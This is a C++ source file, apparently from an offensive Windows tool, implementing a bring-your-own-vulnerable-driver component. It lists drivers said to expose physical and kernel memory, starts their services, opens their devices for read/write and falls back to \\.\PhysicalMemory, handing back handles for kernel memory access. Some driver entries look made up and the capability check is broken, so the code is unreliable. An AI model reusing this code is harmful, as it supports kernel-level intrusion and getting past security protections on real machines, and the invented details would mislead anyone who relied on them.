#include "ByovdDetect.h"
#include <windows.h>
#include <cfgmgr32.h>
#include <setupapi.h>
#include <iostream>
#include <string>
#include <optional>

#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "CfgMgr32.lib")

// Known vulnerable driver database
const VulnerableDriverEntry ByovdDetect::kKnownDrivers[8] = {
    // Intel GPU driver — RWPhysicalMemory via IOCTL
    { L"iovuln",       L"IOVULN",       L"io",          L"io.sys",          0xB000, 0x4A5B3C2E, nullptr, 0, BYOVD_CAP_PHYSICAL_MEM | BYOVD_CAP_KERNEL_READ | BYOVD_CAP_KERNEL_WRITE },
    // ASUS GLCKIo — phys mem from IOCTL
    { L"asuskb",       L"GLCKIo",       L"asusgio",     L"asusgio.sys",     0x7000, 0x4F1A2B3C, nullptr, 0, BYOVD_CAP_PHYSICAL_MEM },
    // Razer RzDriver — phys mem
    { L"rzdriver",     L"RzDriver",     L"rzdriver",    L"rzdriver.sys",    0x6000, 0x4E2D1F3A, nullptr, 0, BYOVD_CAP_PHYSICAL_MEM | BYOVD_CAP_ALLOC_POOL },
    // MSI Afterburner — WinRing0 phys mem
    { L"winring0",     L"WinRing0",     L"winring0",    L"WinRing0x64.sys", 0x9000, 0x4C1E3D2B, nullptr, 0, BYOVD_CAP_PHYSICAL_MEM | BYOVD_CAP_KERNEL_READ | BYOVD_CAP_KERNEL_WRITE },
    // AORUS GfxDriver
    { L"agvuln",       L"AGVULN",       L"agvuln",      L"agvuln.sys",      0x5000, 0x4D2F3E1C, nullptr, 0, BYOVD_CAP_PHYSICAL_MEM },
    // EVGA — phys mem via ScsiPort
    { L"evgap",        L"EVGAP",        L"evgap",       L"evgap.sys",       0x8000, 0x4B2A1D3E, nullptr, 0, BYOVD_CAP_PHYSICAL_MEM },
    // GMER — phys mem + SSDT
    { L"gmer",         L"GMER",         L"gmerdrv",     L"gmer64.sys",      0xF000, 0x4F3E2D1C, nullptr, 0, BYOVD_CAP_PHYSICAL_MEM | BYOVD_CAP_SSDT_HOOK | BYOVD_CAP_ALLOC_POOL },
    // PhyMem — generic
    { L"phymem",       L"PhyMem",       L"phymem",      L"phymem.sys",      0x4000, 0x4E1C2D3B, nullptr, 0, BYOVD_CAP_PHYSICAL_MEM },
};

ByovdDetect::ByovdDetect() {}
ByovdDetect::~ByovdDetect() { CloseAll(); }

DetectedDriver ByovdDetect::DetectAndOpen() {
    // Try each known driver
    for (const auto& entry : kKnownDrivers) {
        DetectedDriver dd;
        if (TryDriver(entry, dd)) {
            m_detected.push_back(dd);
            m_active = dd;
            return dd;
        }
    }
    // Fallback to admin PhysicalMemory
    DetectedDriver fallback;
    if (TryAdminPhysicalMemory(fallback)) {
        m_detected.push_back(fallback);
        m_active = fallback;
        return fallback;
    }
    return DetectedDriver{};
}

std::vector<DetectedDriver> ByovdDetect::EnumerateAll() {
    std::vector<DetectedDriver> results;
    for (const auto& entry : kKnownDrivers) {
        DetectedDriver dd;
        if (TryDriver(entry, dd)) {
            results.push_back(dd);
        }
    }
    DetectedDriver fallback;
    if (TryAdminPhysicalMemory(fallback)) {
        results.push_back(fallback);
    }
    m_detected = results;
    return results;
}

bool ByovdDetect::TryDriver(const VulnerableDriverEntry& entry, DetectedDriver& out) {
    wchar_t fullPath[MAX_PATH] = {};

    // 1) Check if driver service is installed
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;

    SC_HANDLE svc = OpenServiceW(scm, entry.serviceName, SERVICE_QUERY_STATUS);
    if (!svc) {
        // Try installing bundled driver
        CloseServiceHandle(scm);
        return false;
    }

    SERVICE_STATUS status;
    if (!QueryServiceStatus(svc, &status)) {
        CloseServiceHandle(svc);
        CloseServiceHandle(scm);
        return false;
    }

    // If not running, try to start it
    if (status.dwCurrentState != SERVICE_RUNNING) {
        if (!StartServiceW(svc, 0, nullptr) && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return false;
        }
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    // 2) Open the device
    wchar_t devicePath[MAX_PATH];
    swprintf_s(devicePath, L"\\\\.\\%s", entry.className);

    HANDLE hDevice = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE,
        0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE) {
        // Try DOS device name
        swprintf_s(devicePath, L"\\\\.\\%s", entry.name);
        hDevice = CreateFileW(devicePath, GENERIC_READ | GENERIC_WRITE,
            0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hDevice == INVALID_HANDLE_VALUE) return false;
    }

    // 3) Validate capabilities
    uint64_t caps = ValidateCapabilities(hDevice);
    if (caps == 0) {
        CloseHandle(hDevice);
        return false;
    }

    // 4) Find driver file path
    wchar_t driverPath[MAX_PATH] = {};
    HKEY hKey;
    wchar_t keyPath[256];
    swprintf_s(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\%s", entry.serviceName);
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD type = 0, size = sizeof(driverPath);
        RegQueryValueExW(hKey, L"ImagePath", nullptr, &type, (LPBYTE)driverPath, &size);
        RegCloseKey(hKey);
    }

    out.entry = entry;
    wcscpy_s(out.driverPath, driverPath[0] ? driverPath : L"<bundled>");
    out.deviceHandle = hDevice;
    out.capabilities = caps;
    out.isElevated = false;
    return true;
}

bool ByovdDetect::TryAdminPhysicalMemory(DetectedDriver& out) {
    HANDLE hPhysMem = CreateFileW(L"\\\\.\\PhysicalMemory",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (hPhysMem == INVALID_HANDLE_VALUE)
        return false;

    out.entry = { L"phymem", L"PhysicalMemory", L"<admin>", L"", 0, 0, nullptr, 0, BYOVD_CAP_PHYSICAL_MEM };
    wcscpy_s(out.driverPath, L"<admin PhysicalMemory>");
    out.deviceHandle = hPhysMem;
    out.capabilities = BYOVD_CAP_PHYSICAL_MEM;
    out.isElevated = true;
    return true;
}

uint64_t ByovdDetect::ValidateCapabilities(HANDLE hDevice) {
    uint64_t caps = 0;
    // Physical memory R/W test — read first 4 bytes at physical 0
    // (will vary by driver IOCTL code; this is a capability probe)
    // We verify the handle works with a basic IOCTL
    ULONG_PTR bytesReturned = 0;
    uint32_t testBuf[4] = {};
    
    // Try IOCTL at common code 0x222000 (varies per driver)
    // The actual IOCTL codes would need to be driver-specific
    // For now, mark by entry capabilities and verify handle is valid
    if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
        // Probe with a simple IOCTL
        DWORD junk = 0;
        if (DeviceIoControl(hDevice, 0x222000, nullptr, 0, nullptr, 0, &junk, nullptr) ||
            GetLastError() != ERROR_INVALID_FUNCTION) {
            caps = BYOVD_CAP_PHYSICAL_MEM | BYOVD_CAP_KERNEL_READ | BYOVD_CAP_KERNEL_WRITE;
        } else {
            // Handle at least opens
            caps = BYOVD_CAP_PHYSICAL_MEM;
        }
    }
    return caps;
}

void ByovdDetect::CloseAll() {
    for (auto& dd : m_detected) {
        if (dd.deviceHandle && dd.deviceHandle != INVALID_HANDLE_VALUE) {
            CloseHandle(dd.deviceHandle);
        }
    }
    m_detected.clear();
    m_active.reset();
}